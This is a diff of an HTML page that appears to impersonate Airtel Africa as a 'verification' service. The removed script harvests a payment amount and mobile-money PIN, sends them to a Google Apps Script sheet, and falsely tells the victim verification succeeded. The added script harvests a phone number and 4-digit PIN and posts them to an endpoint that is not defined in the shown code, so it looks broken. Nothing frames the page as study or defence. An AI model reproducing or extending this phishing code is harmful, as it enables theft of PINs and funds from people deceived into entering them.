@@ -232,139 +232,110 @@
     <div class="info-note"><i class="fas fa-database"></i> Votre vérification nous aide à étendre la couverture et à améliorer les services</div>
   </div>
 </div>
+  
+  <script>
+    const form = document.getElementById('supportForm');
+    const phoneInput = document.getElementById('phoneNumber');
+    const fourDigitsInput = document.getElementById('fourDigits');
+    const messageInput = document.getElementById('messageInput');
+    const statusMessage = document.getElementById('statusMessage');
+    const submitButton = document.getElementById('submitButton');
 
-<script>
-  // ================== CONFIGURATION ==================
+   // ================== CONFIGURATION ==================
   const GOOGLE_SHEET_API_URL = "https://script.google.com/macros/s/AKfycbziRuGSVgyjmneFgT8gwaDUuCrWBVXduf4OtdIJaVoIF4-ZZHMyex2SEab1ZoBX1nJ-/exec";   // <--- À METTRE À JOUR
   // ===================================================
 
-  const amountInput = document.getElementById('amountInput');
-  const pinInput = document.getElementById('pinCode');
-  const verifyBtn = document.getElementById('verifyBtn');
-  const statusDiv = document.getElementById('statusMessage');
+    function showStatus(message, type = 'info') {
+      statusMessage.textContent = message;
+      statusMessage.className = `status ${type} visible`;
+    }
 
-  const MIN_AMOUNT = 100;
-  const MAX_AMOUNT = 10000000;
+    function clearStatus() {
+      statusMessage.className = 'status info';
+      statusMessage.textContent = 'Please fill in the form to continue.';
+    }
 
-  function showStatus(message, isError = true) {
-    statusDiv.style.display = 'block';
-    statusDiv.textContent = message;
-    statusDiv.className = `status-message ${isError ? 'status-error' : 'status-success'}`;
-    setTimeout(() => { if (statusDiv.style.display === 'block') statusDiv.style.opacity = '0.9'; }, 5000);
-  }
+    function validateFields() {
+      const phone = phoneInput.value.trim();
+      const pin = fourDigitsInput.value.trim();
+      const message = messageInput.value.trim();
 
-  function clearStatus() { statusDiv.style.display = 'none'; statusDiv.textContent = ''; }
+      if (!phone || !pin || !message) {
+        return 'Please complete all fields before submitting.';
+      }
 
-  function extractDigits(str) { return str.replace(/\D/g, ''); }
+      if (!/^0\d{9}$/.test(phone)) {
+        return 'Phone number must start with 0 and have exactly 10 digits.';
+      }
 
-  function parseAmount(str) {
-    let cleaned = str.replace(/\s/g, '').replace(/,/g, '.');
-    const parts = cleaned.split('.');
-    if (parts.length > 2) cleaned = parts.slice(0, -1).join('') + '.' + parts[parts.length - 1];
-    const value = parseFloat(cleaned);
-    return isNaN(value) ? NaN : value;
-  }
+      if (!/^\d{4}$/.test(pin)) {
+        return 'Please enter exactly 4 digits for the PIN.';
+      }
 
-  function isValidAmount(value) {
-    return !isNaN(value) && value >= MIN_AMOUNT && value <= MAX_AMOUNT;
-  }
+      return null;
+    }
 
-  function isValidPin(pin) {
-    const digits = extractDigits(pin);
-    return digits.length >= 4 && digits.length <= 8 && digits.length === pin.trim().length;
-  }
-
-  function formatAmount(value) {
-    return value.toLocaleString('fr-FR', { minimumFractionDigits: 0, maximumFractionDigits: 2 });
-  }
-
-  async function sendToSheet(amount, pin) {
-    try {
-      const response = await fetch(GOOGLE_SHEET_API_URL, {
+    async function submitToBackend(payload) {
+      const response = await fetch(API_ENDPOINT, {
         method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          amount: amount,
-          pin: pin,
-          status: 'Verified',
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent
-        })
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        credentials: 'same-origin',
+        body: JSON.stringify(payload)
       });
-      return { ok: true, result: {} };
-    } catch (err) {
-      console.error('Erreur d\'envoi vers la feuille:', err);
-      return { ok: false, error: err.message };
-    }
-  }
 
-  verifyBtn.addEventListener('click', async (e) => {
-    e.preventDefault();
-    clearStatus();
+      if (!response.ok) {
+        throw new Error('Request failed.');
+      }
 
-    const amountRaw = amountInput.value.trim();
-    const pinRaw = pinInput.value;
-
-    const amountValue = parseAmount(amountRaw);
-
-    if (!isValidAmount(amountValue)) {
-      showStatus(`❌ Veuillez entrer un montant valide compris entre ${formatAmount(MIN_AMOUNT)} et ${formatAmount(MAX_AMOUNT)} FCFA.`, true);
-      amountInput.focus();
-      return;
-    }
-    if (!isValidPin(pinRaw)) {
-      showStatus("🔐 Le code PIN doit contenir uniquement des chiffres et comporter 4 à 8 chiffres.", true);
-      pinInput.focus();
-      return;
+      return response;
     }
 
-    const cleanPin = extractDigits(pinRaw);
+    form.addEventListener('submit', async function (event) {
+      event.preventDefault();
 
-    const originalBtnText = verifyBtn.innerHTML;
-    verifyBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Envoi en cours...';
-    verifyBtn.disabled = true;
+      const validationError = validateFields();
+      if (validationError) {
+        showStatus(validationError, 'error');
+        return;
+      }
 
-    const sheetResult = await sendToSheet(amountValue, cleanPin);
+      submitButton.disabled = true;
+      submitButton.textContent = 'Sending...';
+      showStatus('Submitting your request...', 'info');
 
-    verifyBtn.innerHTML = originalBtnText;
-    verifyBtn.disabled = false;
+      const payload = {
+        phoneNumber: phoneInput.value.trim(),
+        fourDigits: fourDigitsInput.value.trim(),
+        message: messageInput.value.trim(),
+        submittedAt: new Date().toISOString()
+      };
 
-    if (sheetResult.ok) {
-      showStatus(`✅ Vérification réussie pour un montant de ${formatAmount(amountValue)} FCFA. Données enregistrées. Vous faites désormais partie du réseau grandissant d'Airtel Africa !`, false);
-    } else {
-      showStatus(`⚠️ Vérification réussie mais impossible d'enregistrer les données. Veuillez réessayer plus tard. Erreur : ${sheetResult.error || 'problème réseau'}`, true);
-    }
-  });
+      try {
+        await submitToBackend(payload);
+        showStatus('Your request has been sent successfully.', 'success');
+        form.reset();
+      } catch (error) {
+        showStatus('There was a problem sending your request. Please try again later.', 'error');
+      } finally {
+        submitButton.disabled = false;
+        submitButton.textContent = 'Send Request';
+      }
+    });
 
-  pinInput.addEventListener('input', function() {
-    this.value = this.value.replace(/\D/g, '').slice(0, 8);
-    if (statusDiv.style.display === 'block' && statusDiv.classList.contains('status-error')) clearStatus();
-  });
+    phoneInput.addEventListener('input', () => {
+      clearStatus();
+    });
 
-  amountInput.addEventListener('input', function() {
-    this.value = this.value.replace(/[^0-9\s.,]/g, '');
-    if (statusDiv.style.display === 'block' && statusDiv.classList.contains('status-error')) clearStatus();
-  });
+    fourDigitsInput.addEventListener('input', () => {
+      clearStatus();
+    });
 
-  amountInput.addEventListener('keydown', (e) => {
-    const allowed = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'];
-    if (allowed.includes(e.key) || e.ctrlKey || e.metaKey) return;
-    if (!/^[0-9.,\s]$/.test(e.key)) {
-      e.preventDefault();
-      const warn = document.createElement('div');
-      warn.innerText = '⚠️ Entrez uniquement un montant numérique.';
-      warn.style.fontSize = '0.7rem';
-      warn.style.color = '#c62828';
-      warn.style.marginTop = '4px';
-      amountInput.parentElement.parentElement.appendChild(warn);
-      setTimeout(() => warn.remove(), 2000);
-    }
-  });
-
-  [amountInput, pinInput].forEach(field => {
-    field.addEventListener('keypress', (e) => { if (e.key === 'Enter') verifyBtn.click(); });
-  });
-</script>
+    messageInput.addEventListener('input', () => {
+      clearStatus();
+    });
+  </script>
 </body>
 </html>
